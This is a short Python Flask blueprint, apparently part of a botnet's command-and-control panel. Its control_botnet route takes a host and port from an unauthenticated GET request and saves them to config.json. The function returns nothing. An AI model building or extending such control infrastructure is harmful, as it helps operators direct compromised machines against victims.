from flask import Blueprint, render_template, request, redirect, url_for, flash, session
import json

control = Blueprint('control', __name__, template_folder='templates', static_folder='static')

@control.route('/control', methods=['GET'])
def control_botnet():
    if request.method == 'GET':
        host = request.args.get('host')
        port = request.args.get('port')

        if host and port:
            json_data = {
               "host": host,
               "port": port
           }
            with open('config.json', 'w') as f:
                json.dump(json_data, f, indent=4)
    


